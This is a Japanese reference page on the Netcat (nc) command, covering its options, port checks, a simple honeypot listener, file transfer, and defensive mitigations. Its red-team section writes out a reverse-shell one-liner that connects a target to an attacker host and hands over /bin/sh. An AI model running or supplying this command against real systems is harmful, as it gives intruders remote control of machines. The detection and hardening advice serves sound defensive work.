# Command - Linux - nc - ネットワークの万能ツール (Netcat)

## 概要

`nc` (Netcat) は、TCP または UDP プロトコルを使用してネットワーク接続を読み書きするためのバックエンドツールです。サーバーとしてもクライアントとしても動作し、スクリプトから簡単に利用できるため、ネットワークのデバッグから脆弱性診断まで幅広く活用されます。

(出自: 伝統的な `netcat`、現在は OpenBSD 版や Nmap プロジェクトの `ncat` が主流)

## 🛠 関連コマンド

| コマンド | 役割 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `telnet` | テキストベースの通信。暗号化がなく、最近は `nc` に取って代わられた。 | レガシーな接続確認 |
| `nmap` | 高度なポートスキャンとネットワーク探索。 | **網羅的なスキャン** |
| `socat` | `nc` の超強化版。双方向通信、SSL/TLS、Unixソケットなどをサポート。 | 複雑なリレー・転送 |
| `ss` | 自分のマシンのソケット状態を確認する。 | ローカルのポート確認 |

## 主要なオプション

※ディストリビューション（OpenBSD版か、Nmapのncatか等）により微妙に異なります。

| オプション | 説明 |
| :--- | :--- |
| ⭐️ `-l` | **リスニングモード。** サーバーとして待機する。 |
| ⭐️ `-p <port>` | 使用するローカルポート番号を指定。 |
| ⭐️ `-v` | 詳細表示（Verbose）。接続の成否を確認するのに必須。 |
| ⭐️ `-z` | ゼロ I/O モード。データを送らずに接続の成否のみを確認（スキャン用）。 |
| ⭐️ `-u` | TCP ではなく **UDP** を使用する。 |
| ⭐️ `-w <sec>` | タイムアウト時間を指定。 |
| ⚠️ `-e <cmd>` | 接続後に指定したコマンドを実行する（**リバースシェルの原因**。最近は削除されていることが多い）。 |

## 業務シナリオ別活用法

### 1. インフラ構築・運用視点

* **タスク**: ファイアウォールの開放確認（疎通確認）。
* **解説**: アプリをインストールする前に、宛先のポートが開いているかを確認します。
* **例**:
    ```bash
    # 宛先サーバー 192.168.1.10 の 80番ポートが開いているか確認
    nc -zv 192.168.1.10 80
    ```

### 2. ブルーチーム視点

* **タスク**: 簡易的なハニーポート（罠）の設置。
* **解説**: 普段使っていないポートで `nc` を待機させ、誰かが接続してきたらログに残すことで、内部侵入者の偵察行動を検知します。
* **例**:
    ```bash
    # 4444番ポートで待機し、接続があったら内容を表示する
    nc -lvp 4444
    ```

### 3. レッドチーム視点

* **タスク**: リバースシェルの構築。
* **解説**: ターゲット側から攻撃者の待ち受け端末へ接続させ、操作権限を奪取します。
* **例**:
    ```bash
    # 攻撃者側 (1.2.3.4) で待機
    nc -lvp 9999
    
    # ターゲット側で実行（伝統的な nc の場合）
    nc 1.2.3.4 9999 -e /bin/sh
    ```

## セキュリティに関する考慮事項

### 脆弱性とリスク

* **Data Exfiltration**: `nc` を使えば、暗号化もログも残さずに、ファイルを外部へ簡単に持ち出せてしまいます。
* **Reverse Shell**: 侵入の足がかりとして最も多用される手法の一つです。

### 対応策・緩和策 (ブルーチーム視点)

* **バイナリの制限**: 一般ユーザーによる `nc` の実行を制限、または `nc` 自体をインストールしない（必要時のみ導入）。
* **EDR/ログ監視**: `nc -e` や `nc -lp` といった特徴的な引数でのプロセス実行を監視し、アラートを飛ばします。
* **アウトバウンド通信制限**: サーバーから外部への不要なポート（特に 4444 や 9999 等の非標準ポート）への通信をファイアウォールで遮断します。

## 注意点・補足

* **`ncat` のススメ**: Nmap プロジェクトが開発している `ncat` は、SSL 通信のサポートや、アクセス制限機能 (`--allow`) があり、より安全で高機能です。
* **ファイル転送の裏技**: `nc` はパイプを使えばファイル転送も可能です。
    * 受信側: `nc -l 1234 > received.file`
    * 送信側: `nc <target_ip> 1234 < source.file`
